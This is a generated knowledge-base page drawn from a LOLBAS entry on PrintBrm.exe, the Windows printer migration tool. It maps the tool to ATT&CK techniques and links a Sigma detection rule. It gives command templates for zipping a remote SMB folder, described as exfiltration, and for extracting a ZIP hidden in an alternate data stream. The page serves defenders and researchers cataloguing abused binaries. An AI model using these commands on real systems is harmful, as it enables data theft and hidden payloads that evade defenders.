---
title: "PrintBrm.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OSBinaries/PrintBrm.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/PrintBrm.yml"
build_date: "2026-04-27 19:14:21"
category: "OSBinaries"
aliases:
  - "PrintBrm.exe"
functions:
  - "Download"
  - "ADS"
attack_technique_ids:
  - "T1105"
  - "T1564.004"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Printer Migration Command-Line Tool

## Paths

- `C:\Windows\System32\spool\tools\PrintBrm.exe`

## Commands

### 1. Download

Create a ZIP file from a folder in a remote drive

```cmd
PrintBrm -b -d {PATH_SMB:folder} -f {PATH_ABSOLUTE:.zip}
```

- Use Case: Exfiltrate the contents of a remote folder on a UNC share into a zip file
- Privileges: User
- Operating System: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105: Ingress Tool Transfer]]

### 2. ADS

Extract the contents of a ZIP file stored in an Alternate Data Stream (ADS) and store it in a folder

```cmd
PrintBrm -r -f {PATH_ABSOLUTE}:hidden.zip -d {PATH_ABSOLUTE:folder}
```

- Use Case: Decompress and extract a ZIP file stored on an alternate data stream to a new folder
- Privileges: User
- Operating System: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1564-hide_artifacts#^t1564004-ntfs-file-attributes|T1564.004: NTFS File Attributes]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/35a7244c62820fbc5a832e50b1e224ac3a1935da/rules/windows/process_creation/proc_creation_win_lolbin_printbrm.yml
- IOC: PrintBrm.exe should not be run on a normal workstation

## Resources

- {'Link': 'https://twitter.com/elliotkillick/status/1404117015447670800'}

## Acknowledgements

- {'Person': 'Elliot Killick', 'Handle': '@elliotkillick'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/PrintBrm.yml)
